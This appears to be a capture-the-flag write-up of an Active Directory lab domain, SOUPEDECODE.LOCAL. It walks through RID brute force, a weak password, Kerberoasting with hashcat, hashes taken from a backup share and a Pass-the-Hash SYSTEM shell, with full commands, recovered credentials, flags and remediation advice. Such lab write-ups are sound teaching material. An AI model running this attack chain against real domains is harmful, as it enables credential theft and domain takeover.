```
████████████████████████████████████████████████████████████████████████
  PROTOCOL.BREACH || TARGET: SOUPEDECODE.LOCAL || OPERATION: KERBEROS
████████████████████████████████████████████████████████████████████████
```

### OBJECTIVE

Compromise Active Directory domain controller through Kerberos service ticket exploitation, credential extraction via SMB enumeration, and lateral movement using Pass-the-Hash authentication.

**TARGET DESIGNATION:** DC01.SOUPEDECODE.LOCAL  
**ATTACK VECTOR:** RID Brute Force → Password Spraying → Kerberoasting → Lateral Movement → Domain Compromise  
**DIFFICULTY RATING:** Intermediate-Advanced  

---

### RECONNAISSANCE PHASE

**NETWORK TOPOLOGY**

```
Target: 10.49.169.44 (DC01.SOUPEDECODE.LOCAL)
Domain: SOUPEDECODE.LOCAL
Role: Primary Domain Controller
OS: Windows Server 2019 (Build 20348)
Hostname: DC01
```

**PORT ENUMERATION**

| Port | Service | Status | Purpose |
|------|---------|--------|---------|
| 53 | DNS | Open | Domain name resolution |
| 88 | Kerberos | Open | Authentication—primary exploitation vector |
| 135-139 | RPC/NetBIOS | Open | Service enumeration |
| 389/636 | LDAP/LDAPS | Open | Directory queries |
| 445 | SMB | Open | Share access, lateral movement |
| 3389 | RDP | Open | Terminal Services |
| 9389 | ADWS | Open | Active Directory Web Services |

---

### ENUMERATION PHASE

**SMB SHARE DISCOVERY**

```
smbclient -L 10.49.169.44 -N
```

Available shares (anonymous enumeration):

```
ADMIN$         Remote Admin (access denied)
backup         Custom share (access denied)
C$             Default share (access denied)
IPC$           Remote IPC (empty)
NETLOGON       Logon server share (access denied)
SYSVOL         Group policy (access denied)
Users          User profile directory (access denied)
```

**RID BRUTE FORCE - USER ENUMERATION**

```
nxc smb soupedecode.local -u 'guest' -p '' --rid-brute 3000 | \
grep SidTypeUser | cut -d '\' -f 2 | cut -d ' ' -f 1 > valid_usernames.txt
```

Command brute forces SID ranges to extract all valid domain users without authentication.

**DISCOVERED USERS:**
- ybob317 (initial access candidate)
- file_svc (service account)
- firewall_svc (service account)
- backup_svc (service account)
- web_svc (service account)
- monitoring_svc (service account)

---

### INITIAL COMPROMISE

**WEAK CREDENTIAL DISCOVERY**

During enumeration, identify user with weak/default password:

```
Username: ybob317
Password: ybob317 (matches username)
```

This represents poor password policy enforcement—username matching credentials are detected during standard reconnaissance.

**SMB SHARE ACCESS WITH COMPROMISED ACCOUNT**

```
smbclient.py 'SOUPEDECODE.LOCAL/ybob317:ybob317@dc01.soupedecode.local'
```

With ybob317 access, enumerate internal shares:

```
use Users
cd ybob317
cd Desktop
cat user.txt
```

**USER FLAG OBTAINED**

Flag: `28189316c25dd3c0ad56d44d000d62a8`

---

### PRIVILEGE ESCALATION VIA KERBEROASTING

**SERVICE PRINCIPAL NAME ENUMERATION**

Query SPN records to identify service accounts vulnerable to Kerberoasting:

```
GetUserSPNs.py -request -outputfile kerberoastables.txt \
  'SOUPEDECODE.LOCAL/ybob317:ybob317'
```

**SPN RECORDS EXTRACTED:**

| ServicePrincipalName | Account Name | Purpose |
|----------------------|--------------|---------|
| FTP/FileServer | file_svc | File transfer service |
| FW/ProxyServer | firewall_svc | Network proxy |
| HTTP/BackupServer | backup_svc | Backup infrastructure |
| HTTP/WebServer | web_svc | Web application |
| HTTPS/MonitoringServer | monitoring_svc | System monitoring |

Each SPN is associated with a service account. Kerberoasting extracts TGS (Ticket Granting Service) tickets for offline cracking.

**TICKET EXTRACTION & OFFLINE CRACKING**

```
hashcat kerberoastables.txt /usr/share/wordlists/rockyou.txt
```

Kerberos ticket contains encrypted portion crackable via dictionary attack. No network interaction required after ticket extraction.

**CREDENTIALS RECOVERED:**

```
file_svc : Password123!!
```

---

### LATERAL MOVEMENT PHASE

**BACKUP SHARE ACCESS**

With file_svc credentials, access previously denied backup share:

```
smbclient.py 'SOUPEDECODE.LOCAL/file_svc:Password123!!@dc01.soupedecode.local'
use backup
get backup_extract.txt
```

**ARTIFACT ANALYSIS**

backup_extract.txt contains:

```
Extracted user accounts and NT hashes:
MailServer$     46a4655f18def136b3bfab7b0b4e70e3
FileServer$     e41da7e79a4c76dbd9cf79d1cb325559
[additional machine accounts]
```

Machine account hashes extracted from backup file. These represent computer accounts with elevated privileges in domain.

---

### PASS-THE-HASH EXPLOITATION

**HASH VALIDATION & ACCOUNT ASSESSMENT**

```
nxc smb dc01.soupedecode.local -u backup_extract_users.txt \
  -H backup_extract_hashes.txt \
  --no-bruteforce --continue-on-success
```

Machine Credential Status:

```
FileServer$     e41da7e79a4c76dbd9cf79d1cb325559     [Pwn3d!] ✓ VALID
MailServer$     46a4655f18def136b3bfab7b0b4e70e3     STATUS_LOGON_FAILURE
```

FileServer$ machine account hash is active and authenticated on domain controller.

**SMBEXEC - HASH-BASED SHELL EXECUTION**

```
smbexec.py -hashes :e41da7e79a4c76dbd9cf79d1cb325559 \
  'SOUPEDECODE.LOCAL/FileServer$@dc01.soupedecode.local'
```

Pass-the-Hash authentication uses NTLM hash without requiring plaintext password. Execute commands as compromised machine account.

**PRIVILEGE VERIFICATION**

```
whoami
nt authority\system
```

FileServer$ machine account executes with SYSTEM privileges on domain controller. Machine accounts inherit domain controller permissions.

**SYSTEM FLAG EXTRACTION**

```
type C:\Users\Administrator\Desktop\root.txt
```

Flag: `27cb2be302c388d63d27c86bfdd5f56a`

---

### ATTACK TIMELINE

```
PHASE 1: Reconnaissance
  ├─ Port enumeration
  ├─ Service version detection
  ├─ SMB share enumeration
  └─ Host information gathering

PHASE 2: User Enumeration
  ├─ RID brute force (SID range: 3000)
  ├─ Extract all domain users
  ├─ Identify service accounts
  └─ Generate user list

PHASE 3: Initial Access
  ├─ Identify weak credentials (ybob317:ybob317)
  ├─ SMB authentication
  ├─ User profile access
  └─ User flag retrieval

PHASE 4: Service Account Compromise
  ├─ SPN enumeration (GetUserSPNs)
  ├─ Kerberos ticket extraction
  ├─ Offline hash cracking
  └─ Credential acquisition (file_svc:Password123!!)

PHASE 5: Lateral Movement
  ├─ Backup share access
  ├─ Machine account hash extraction
  ├─ Hash credential validation
  └─ Privilege assessment

PHASE 6: Domain Compromise
  ├─ Pass-the-Hash authentication
  ├─ SYSTEM shell establishment
  ├─ Domain controller access
  └─ System flag retrieval
```

---

### VULNERABILITY ASSESSMENT

**CRITICAL FINDINGS**

1. **Weak User Passwords (CVSS 7.5)**
   - Username matches password (ybob317:ybob317)
   - No complexity requirements enforcement
   - Dictionary brute force effective

2. **Kerberoasting Vulnerability (CVSS 6.5)**
   - Service accounts without protection
   - TGS tickets extractable offline
   - Weak password (Password123!!) crackable
   - No account lockout during enumeration

3. **Backup File Contains Credentials (CVSS 8.2)**
   - Machine account hashes in plaintext backup
   - Accessible via compromised user account
   - No encryption or access restrictions

4. **Pass-the-Hash Enabled (CVSS 8.1)**
   - NTLMv2 authentication accepted without MFA
   - Machine accounts inherit DC privileges
   - No monitoring/alerting on hash reuse

5. **Insufficient Access Controls (CVSS 7.2)**
   - Backup share accessible with single user credential
   - No multi-factor authentication on sensitive resources
   - Privilege escalation path unobstructed

---

### REMEDIATION RECOMMENDATIONS

```
IMPLEMENT:
├─ Enforce strong password policy
│  ├─ Minimum 14 characters
│  ├─ No username/common patterns
│  └─ Regular expiration (30-90 days)
│
├─ Kerberos Hardening
│  ├─ Enable pre-authentication enforcement
│  ├─ Implement SPN protection (Group Policy)
│  ├─ Monitor TGS ticket requests
│  └─ Implement account lockout policy
│
├─ Backup Security
│  ├─ Encrypt backup files with AES-256
│  ├─ Remove credentials from backups
│  ├─ Restrict backup access (ACLs)
│  └─ Regular backup integrity audits
│
├─ Authentication Hardening
│  ├─ Enforce NTLMv2 minimum (disable NTLMv1)
│  ├─ Require MFA for sensitive operations
│  ├─ Implement Kerberos-only policies
│  └─ Monitor NTLM usage patterns
│
└─ Detection & Monitoring
   ├─ Alert on RID brute force attempts
   ├─ Monitor TGS ticket extraction
   ├─ Log backup access events
   └─ Alert on Pass-the-Hash authentication
```

---

### TECHNICAL NOTES

**Tools Utilized:**
- nmap (network enumeration)
- enum4linux (SMB/RPC enumeration)
- smbclient (share access)
- nxc/crackmapexec (credential testing, RID brute force)
- GetUserSPNs.py (Impacket—SPN enumeration)
- hashcat (offline hash cracking)
- smbexec.py (Impacket—command execution)

**Attack Complexity:** Medium (6 distinct phases)  
**Exploitation Timeline:** ~60 minutes (end-to-end)  
**Prerequisites:** RID brute force access, valid initial credentials

**Key Exploitation Techniques:**
- RID brute force (unauthenticated user enumeration)
- Kerberoasting (service account compromise)
- Backup file analysis (credential extraction)
- Pass-the-Hash (machine account reuse)
- Privilege inheritance (machine accounts on DC)

---

```
████████████████████████████████████████████████████████████████████████
  OPERATION COMPLETE || DOMAIN COMPROMISED || SYSTEM ACCESS ACHIEVED
████████████████████████████████████████████████████████████████████████
```
